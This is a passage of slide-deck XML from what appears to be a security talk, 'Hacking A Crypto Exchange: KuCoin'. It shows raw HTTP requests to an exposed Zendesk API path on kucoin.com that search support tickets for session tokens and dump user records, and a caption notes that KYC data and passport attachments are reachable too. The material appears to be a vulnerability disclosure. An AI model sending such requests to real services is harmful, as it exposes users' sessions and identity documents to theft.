            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="542" name="Google Shape;542;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="2067750"/>
            <a:ext cx="8398200" cy="22533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b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Even more fun, there's a search.json endpoint.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>…which allows you to search tickets</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>obviously</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="546" name="Shape 546"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="547" name="Google Shape;547;p68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;548;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="549" name="Google Shape;549;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="550" name="Google Shape;550;p68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="551" name="Google Shape;551;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1728300"/>
            <a:ext cx="8398200" cy="38310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b="1" lang="en" sz="2500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Searching for session tokens:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /_api/zendesk/api/v2/</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>search.json?query=created&gt;2023-04-18T18:23:45Z%20Session</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Connection: close</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="555" name="Shape 555"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="556" name="Google Shape;556;p69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;557;p69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="558" name="Google Shape;558;p69"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="15102" l="4924" r="922" t="44483"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="235475" y="410913"/>
            <a:ext cx="8454525" cy="3600326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="559" name="Google Shape;559;p69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="235475" y="4075700"/>
            <a:ext cx="7584600" cy="923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2400">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>You can search for Session Tokens, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>KYC info, Licenses/passports in attachments, etc..</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="563" name="Shape 563"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="564" name="Google Shape;564;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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5" name="Google Shape;565;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566" name="Google Shape;566;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="567" name="Google Shape;567;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="568" name="Google Shape;568;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1728300"/>
            <a:ext cx="8398200" cy="30168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 sz="2500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Dumping users:</a:t>
            </a:r>
            <a:endParaRPr sz="2500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>GET /_api/zendesk/api/v2/</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>users.json</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Connection: close</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="572" name="Shape 572"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
